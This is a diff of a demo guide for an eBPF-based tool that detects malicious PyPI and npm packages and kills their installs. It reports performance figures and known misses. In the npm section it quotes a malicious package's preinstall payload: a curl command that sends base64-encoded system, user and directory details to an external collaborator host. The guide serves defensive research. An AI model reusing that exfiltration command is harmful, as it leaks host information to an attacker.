@@ -12,233 +12,176 @@ cd ~/scbf2
 
 ---
 
-## 0. Two modes
+## 0. The two guards
 
-**LIVE GUARD — blocks during installation** (this is the default for `pip`):
-
-| command | what it does |
-|---|---|
-| `pip install <x>` | one install, monitored live, **killed mid-flight if malicious** |
-| `sudo scbf-guard-pip install <x>` | the same, called explicitly |
-| `SCBF_DRY_RUN=1 sudo scbf-guard-pip install <x>` | decides but never kills |
-
-Decision at **event 3000** (~60% into a malicious install), on the averaged
-probability of a **3-encoder ensemble**, **p ≥ 0.1925**. Measured on 210 held-out
-traces: **precision 93.22%, recall 93.22%, F1 93.22%, ROC-AUC 0.9839**.
-
-Nothing earlier is actionable — the first ~1,400 events are pip's own resolve,
-download and unpack, identical for every package (ROC-AUC 0.508 at 100 events,
-0.432 at 1000). Discrimination appears at ~1500, where the package's own
-`setup.py` begins executing; event 3000 trades a little earliness for accuracy.
-
-**POST-INSTALL GATE — sandbox first, then install** (the older path):
-
-| command | what it does |
-|---|---|
-| `sudo scbf-pip install <x>` | installs in a sandbox, scores, then installs for real only if ALLOW |
-| `sudo ./scan-live <x>` | scan only, never installs |
-
-Thresholds there: WARN ≥ 7.754, BLOCK ≥ 8.894; benign 4–5.5, malware 11–14.5.
-
----
-
-## 1. Clean packages — expect ALLOW (install completes)
-
-```bash
-pip install requests
-pip install rich
-pip install httpx
-pip install loguru
-pip install tenacity
-pip install flask
-pip install click
-pip install jinja2
-```
-
-**Verified live** (ensemble probability at the decision point):
-
-| package | p(malicious) | verdict |
+| command | ecosystem | what it does |
 |---|---|---|
-| click | 0.0158 | ALLOW |
-| jinja2 | 0.0164 | ALLOW |
-| loguru | 0.0203 | ALLOW |
-| httpx | 0.0233 | ALLOW |
-| flask | 0.0270 | ALLOW |
-| requests | 0.0298 | ALLOW |
-| tenacity | 0.1163 | ALLOW |
-| rich | 0.1670 | ALLOW |
-| **numpy** | **0.1643** | **BLOCKED — false positive** |
-| **pandas** | **0.1611** | **BLOCKED — false positive** |
+| `sudo scbf-guard-pip install <x>` | PyPI | one install, monitored live, **killed mid-flight if malicious** |
+| `sudo scbf-guard-npm install <x>` | npm | same, for `npm install` |
+| `SCBF_DRY_RUN=1 sudo scbf-guard-pip install <x>` | — | decides but never kills |
 
-8 of 10 correct. `numpy` and `pandas` are the realistic failure mode: large
-packages with compiled extensions sit closest to the decision boundary.
+**PyPI** decides at events **1500 / 2200 / 3000**, each with its own
+validation-tuned threshold. **npm** decides at event **1500**.
 
----
+Several decision points exist because a single 3000-event point is reached by
+only 59% of installs — the rest finish first and would only be judged after the
+payload had already run. Nothing useful exists before ~1200 events: that window
+is the installer's own resolve/download/unpack, near-identical for every package
+(ROC-AUC 0.57).
 
-## 2. Malware — the install is KILLED mid-flight
+Held-out performance:
 
-```bash
-pip install ~/scbf2/data/raw/pypi_malware/PyTorchy-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/etheriuum-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/selenyum-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/requiremenstx-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/capmonsterclouddclient-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/tensobflow-1.0.0.tar.gz
-pip install ~/scbf2/data/raw/pypi_malware/asteroid_filterbank-0.4.0.tar.gz
-```
-
-**Verified live — 7 of 7 terminated:**
-
-| package | p(malicious) | verdict |
-|---|---|---|
-| selenyum-1.0.0 | 0.9834 | BLOCKED |
-| etheriuum-1.0.0 | 0.9628 | BLOCKED |
-| tensobflow-1.0.0 | 0.9422 | BLOCKED |
-| PyTorchy-1.0.0 | 0.9007 | BLOCKED |
-| capmonsterclouddclient-1.0.0 | 0.8887 | BLOCKED |
-| requiremenstx-1.0.0 | 0.6797 | BLOCKED |
-| asteroid_filterbank-0.4.0 | 0.1119 | BLOCKED (later checkpoint) |
-
-Expected output:
-
-```
-[guard] ensemble of 3 models
-[guard] event 3000: p(malicious)=0.9007 distance=9.02 -> BLOCK
-[guard] TERMINATING installer process tree (pid 4363) at event 3000
-[+] VERDICT : BLOCKED — install terminated mid-flight
-[!] INSTALLATION FAILED
-```
+| | precision | recall | F1 |
+|---|---|---|---|
+| PyPI @3000 | 100.00% | 86.44% | 92.73% |
+| PyPI @1500 | 100.00% | 79.66% | 88.68% |
+| npm @1500 | 90.48% | 66.67% | 76.77% |
 
 ---
 
-## 3. The one it MISSES — show this too
+## 1. Malware — the install is KILLED mid-flight
+
+**PyPI:**
 
 ```bash
-pip install ~/scbf2/data/raw/pypi_malware/colorsama-0.4.5.tar.gz
+sudo scbf-guard-pip install data/raw/pypi_malware/eepl-4.5.2.tar.gz
+sudo scbf-guard-pip install data/raw/pypi_malware/pyghoster-1.0.0.tar.gz
+sudo scbf-guard-pip install data/raw/pypi_malware/BeautifullSooup-1.0.0.tar.gz
 ```
 
-Installs successfully — a false negative.
+Expected:
 
-`colorsama` is a typosquat of `colorama` whose `setup.py` is a **verbatim copy of
-the legitimate one**, right down to the BSD licence header. Its payload runs at
-*import*, not at install, so there is no install-time behaviour to observe. No
-install-time method can catch this class of attack.
-
-Demonstrate it alongside the successes. It is the honest illustration of the
-limits, and presenting it yourself is far more credible than having a reviewer
-find it.
-
----
-
-## 4. Override and bypass
-
-Decide but never kill (useful for demos):
-
-```bash
-SCBF_DRY_RUN=1 sudo scbf-guard-pip install ~/scbf2/data/raw/pypi_malware/PyTorchy-1.0.0.tar.gz
+```
+[guard] multi-window stage loaded: windows [1500, 2200, 3000] ...
+[guard] event 1500: p(malicious)=1.0000 distance=11.002 -> BLOCK
+[guard] TERMINATING installer process tree (pid 11916) at event 1500
+[+] VERDICT        : BLOCKED — install terminated mid-flight
+[!] INSTALLATION BLOCKED — terminated by the guard
+[✗] BLOCKED — the installer was terminated before it finished.
 ```
 
-Change the block threshold for one run:
+**npm:**
 
 ```bash
-SCBF_BLOCK_P=0.9 sudo scbf-guard-pip install ~/scbf2/data/raw/pypi_malware/PyTorchy-1.0.0.tar.gz
+sudo scbf-guard-npm install data/raw/npm_malware/207_eslint-plugin-cas-1.1.5.tgz
 ```
 
-Skip the guard entirely for one command:
+That package's `preinstall` is a live exfiltration payload:
 
-```bash
-SCBF_BYPASS=1 pip install numpy
+```
+/usr/bin/curl --data "$(uname -a|base64)--$(id|base64)--$(pwd|base64)" \
+    $(hostname).eslint.<subdomain>.oastify.com
 ```
 
-Remove the interception:
+**Verify the block was real** — the package must be absent afterwards:
 
 ```bash
-sudo rm /usr/local/bin/pip
+ls /tmp/scbf_install_env 2>/dev/null || echo "environment discarded — install did not persist"
 ```
 
 ---
 
-## 5. Scan without installing
+## 2. Clean packages — expect ALLOW
+
+Use **local artifacts** for the demo:
 
 ```bash
-sudo ./scan-live requests
+sudo scbf-guard-pip install data/raw/pypi_benign/katna-0.9.2.tar.gz
+sudo scbf-guard-pip install data/raw/pypi_benign/pathml-2.1.1.tar.gz
+sudo scbf-guard-npm install data/raw/npm_benign/pex-gl-3.0.0.tgz
 ```
 
-Re-scan a trace already captured:
+Measured: **10/10 clean PyPI, 8/10 clean npm** allowed.
 
-```bash
-.venv/bin/python -m scbf.detection.scan --trace /tmp/gate_numpy.jsonl --models models
-```
-
-Batch a whole directory:
-
-```bash
-.venv/bin/python -m scbf.detection.scan --batch data/traces/malware/traces --limit 20 --models models
-```
+> ⚠️ **Do not demo `sudo scbf-guard-pip install requests`.** It is falsely
+> blocked. Every benign training trace came from a local `.tar.gz`, so a real
+> registry download looks like exfiltration. Measured 4/6 on registry installs —
+> `requests` and `certifi` fail. This is a known defect; see README *Known
+> limits*.
 
 ---
 
-## 6. Reading the output
+## 3. The ones it misses — show these too
 
-**Live guard** (what `pip install` now prints):
+```bash
+sudo scbf-guard-pip install data/raw/pypi_malware/xpip-20.2.4.tar.gz
+sudo scbf-guard-npm install data/raw/npm_malware/152_crypto_mintme-1.0.0.tgz
+```
+
+Live rates are **10/12 PyPI** and **6/10 npm**. Showing a miss is more
+convincing than hiding it, and for npm there is a concrete reason: 26% of the
+malicious packages declare no install hook at all, so they execute nothing
+during installation and no install-time monitor can see them.
+
+---
+
+## 4. Dry run — decide without killing
+
+```bash
+SCBF_DRY_RUN=1 sudo scbf-guard-pip install data/raw/pypi_malware/eepl-4.5.2.tar.gz
+```
+
+Prints the verdict at each checkpoint and lets the install finish. Useful for
+showing the probability climbing as evidence accumulates.
+
+---
+
+## 5. Reading the output
 
 ```
-[guard] event 1500: p(malicious)=0.8078 distance=6.303 -> BLOCK
-[guard] TERMINATING installer process tree (pid 5296) at event 1500
-[+] VERDICT : BLOCKED — install terminated mid-flight
+[guard] event 1500: p(malicious)=0.9810 distance=10.937 -> BLOCK
+[guard] TERMINATING installer process tree (pid 11677) at event 1500
+[+] VERDICT        : BLOCKED — install terminated mid-flight
 ```
 
 | field | meaning |
 |---|---|
 | **event N** | the checkpoint at which this decision was taken |
-| **p(malicious)** | the TGN's probability — **this drives the decision**, BLOCK at ≥ 0.685 |
-| **distance** | envelope distance at that checkpoint — corroborating, not deciding |
-| **verdict** | BLOCK kills the process tree; WARN is logged and the install continues |
+| **p(malicious)** | model probability — **this drives the decision** |
+| **distance** | envelope distance — corroborating only, `0.000` for npm (no envelope) |
+| **verdict** | BLOCK kills the process tree; WARN is logged, install continues |
 
-**Post-install gate** (`scbf-pip` / `scan-live`) prints a different format, with
-an envelope distance on the completed trace: WARN ≥ 7.754, BLOCK ≥ 8.894,
-benign ≈ 4–5.5, malware ≈ 11–14.5, plus a threat score and evidence list.
+Thresholds are per checkpoint: PyPI 0.7997 @1500, 0.9425 @2200, 0.9568 @3000;
+npm 0.6010 @1500. All tuned on validation, never on test.
+
+---
+
+## 6. If a verdict looks inconsistent
+
+**The same package can block at a different checkpoint between runs**, or
+occasionally not at all. Trace length varies run to run — `eepl` has blocked at
+1500 and at 2200 on different runs. This is expected; re-run to confirm.
+
+**If everything is suddenly allowed**, check the sinkhole:
+
+```bash
+getent hosts pypi.org              # must resolve to a real address
+getent hosts evil.example.com      # must resolve to 203.0.113.1
+ip addr show scbfsink              # must exist
+```
+
+The sinkhole must point at `203.0.113.1`, **not** `127.0.0.1`. The feature
+extractor counts a contact as external only when it is off loopback/RFC1918, so
+sinking to localhost makes `n_ext_connect` zero for every package and hides the
+strongest malicious signal. That fault once made the guard allow known malware
+at p=0.0000.
 
 ---
 
 ## 7. What to say when demoing
 
-**What it does.** Captures install-time behaviour with eBPF, encodes it as a
-temporal graph, and judges distance from a calibrated envelope of benign
-installs. No signatures, no rules, no threat feed.
+**What it does.** Captures install-time behaviour with eBPF, builds a temporal
+graph incrementally as the install runs, and scores the *partial* graph with a
+temporal graph network. No signatures, no rules, no threat feed.
 
-**Measured performance.**
+**Why it is different.** Every comparable tool — OSCAR, Guarddog, Amalfi, SAP —
+analyses the complete package and reports afterwards. SCBF decides while the
+installer is still running and terminates it.
 
-- *Install-time blocking* (main result): **precision 93.22%, recall 93.22%,
-  F1 93.22%, ROC-AUC 0.9839** on a held-out test split, decision at event 3000.
-  Beats OSCAR on recall (+8.22) and F1 (+2.22). Live-validated 7/7 malware
-  terminated, 8/10 clean allowed.
-- *Post-install detection*: 92.04% F1 single split; **88.93% ± 1.68%
-  cross-validated** over all 389 malicious packages.
-- The dataset passes the leakage audit.
+**The honest numbers.** PyPI 92.73% F1 against OSCAR's 91.00% on the same
+benchmark. npm 76.77% against their 95.00% — SCBF loses there, because 26% of
+npm malware executes nothing during installation.
 
-**Be upfront about the limits:**
-
-- Roughly **1 in 15 malicious packages is missed** on the held-out split
-  (4 of 59), `colorsama` among them.
-- **False positives on heavy compiled packages** — `numpy` and `pandas` were
-  both blocked live. Precision on the benchmark's benign set (93.22%)
-  overstates precision on large real-world packages.
-- The install target is a throwaway venv (`/tmp/scbf_install_env`). Killing
-  mid-install leaves a half-populated site-packages, so it has to be
-  discardable. Pointing this at a real environment needs rollback handling,
-  which does not exist yet.
-- **The package still executes once**, inside the sandbox. The gate reports what
-  it did; it does not prevent it from acting during that run. Only the VM
-  isolates you.
-- **81.2 % of malicious traces show no obvious malicious indicator** — no
-  `curl`, no external connection, no credential read. The model separates the
-  classes on distributed structure, largely that benign packages *install
-  substance* (`rich` wrote 1,085 files; `etheraem` wrote 67). So a BLOCK is not
-  a claim that a specific named attack occurred.
-- **Near-threshold scores are not stable.** The same `etheraem` scored 14.21 in
-  one capture and 11.06 in another. A package near 7.754 can flip between runs.
-- Large scientific packages sit closer to the line (`numpy` scored 6.56), so
-  false positives on heavy compiled packages are a realistic failure mode.
-
-Treat the verdict as a prioritisation signal for review, not a proof.
+**What not to claim.** That it beats everything; that it works on registry
+installs today; that the TGN is the full Rossi et al. architecture (it is the
+memory module only, no attention).
